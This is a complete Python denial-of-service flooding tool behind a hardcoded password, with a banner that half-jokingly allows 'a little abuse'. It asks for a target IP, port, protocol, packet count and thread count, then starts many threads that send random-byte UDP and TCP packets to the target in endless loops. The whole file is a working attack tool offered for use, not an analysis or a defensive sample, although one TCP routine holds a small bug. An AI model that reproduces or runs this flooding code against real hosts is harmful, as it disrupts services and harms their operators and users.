#!/usr/bin/env python3
#Autor : DevXyZ  
#Ramake Xrian                                       
password ='Xrian'
import random
import socket
import struct
import codecs
import time
import socket
import threading
import os
import sys

os.system("clear")
for i in range(3):
    pwd = input("\033[0m<Xrian> \033[93mPassword > ")
    j=3
    if(pwd==password):
        time.sleep(2)
        print("\033[0m<Xrian> \033[94m Tunggu 5 Detik... ")
        break
    else:
        time.sleep(5)
        print("\033[0m<Xrian> \033[94m Password Salah!!! ")
        continue
time.sleep(2)
print("\033[0m<Xrian> \033[93mBerhasil Masuk ke \033[91mXrian ")
time.sleep(2)

os.system("clear")
print("""

▒██   ██▒    ██▀███      ██▓    ▄▄▄          ███▄    █ 
▒▒ █ █ ▒░   ▓██ ▒ ██▒   ▓██▒   ▒████▄        ██ ▀█   █ 
░░  █   ░   ▓██ ░▄█ ▒   ▒██▒   ▒██  ▀█▄     ▓██  ▀█ ██▒
 ░ █ █ ▒    ▒██▀▀█▄     ░██░   ░██▄▄▄▄██    ▓██▒  ▐▌██▒
▒██▒ ▒██▒   ░██▓ ▒██▒   ░██░    ▓█   ▓██▒   ▒██░   ▓██░
▒▒ ░ ░▓ ░   ░ ▒▓ ░▒▓░   ░▓      ▒▒   ▓▒█░   ░ ▒░   ▒ ▒ 
░░   ░▒ ░     ░▒ ░ ▒░    ▒ ░     ▒   ▒▒ ░   ░ ░░   ░ ▒░
 ░    ░       ░░   ░     ▒ ░     ░   ▒         ░   ░ ░ 
 ░    ░        ░         ░           ░  ░            ░ 
                                                       

""")
print("\033[92m Tools By \033[96mXrian")
print("\033[93m No Abuse")
print("\033[94m Abuse Dikit Gpp")
print(" ")
ip = str(input(" \033[91mMasukin Ip >"))
port = int(input(" \033[92mMasukin \033[94m Port >"))
choice = str(input(" \033[93mKetik \033[92m UDP >"))
times = int(input(" \033[93mMau berapa \033[92m Paket >"))
threads = int(input(" \033[94mBerapa \033[93m Threads >"))
print(f" \033[92mMencoba connect ke ip/port \033[91m{ip}\033[0m:\033[94m{port}")
time.sleep(5)
print("\033[0m")

#Attack
os.system("clear")
def run():
        data = random._urandom(2500)
        i = random.choice(("\033[93m Xrian Menyudut IP \033[91m{ip}\033[94m DAN Memberi Kopi Ke PORT \033[91m{port}"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(f"\033[93m Xrian Menyudut IP \033[91m{ip}\033[94m DAN Memberi Kopi Ke PORT \033[91m{port}")
                except:
                        print(f"\033[93m Xrian Menyudut IP \033[91m{ip}\033[94m DAN Memberi Kopi Ke PORT \033[91m{port}")

def run2():
        data = random._urandom(16)
        i = random.choice(("\033[93m Xrian Menyudut IP \033[91m{ip}\033[94m DAN Memberi Kopi Ke PORT \033[91m{port}"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(f"\033[93m Xrian Menyudut IP \033[91m{ip}\033[94m DAN Memberi Kopi Ke PORT \033[91m{port}")
                except:
                        s.close()
                        print(f"\033[93m Xrian Menyudut IP \033[91m{ip}\033[94m DAN Memberi Kopi Ke PORT \033[91m{port}")

def run3():
        data = random._urandom(6)
        i = random.choice(("\033[93m Xrian Menyudut IP \033[91m{ip}\033[94m DAN Memberi Kopi Ke PORT \033[91m{port}"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(f"\033[93m Xrian Menyudut IP \033[91m{ip}\033[94m DAN Memberi Kopi Ke PORT \033[91m{port}")
                except:
                        s.close()
                        print(f"\033[93m Xrian Menyudut IP \033[91m{ip}\033[94m DAN Memberi Kopi Ke PORT \033[91m{port}")

def tcp():
    data = random._urandom(1025)
    while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(time):
                    s.send(data)
                print('\033[91m Xrian')
            except:
                s.close

for y in range(threads):
  if choice == 'TCP':
    th = threading.Thread(target = tcp)
    th.start()

for y in range(threads):
        if choice == 'UDP':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
        else:
                th = threading.Thread(target = run3)
                th.start()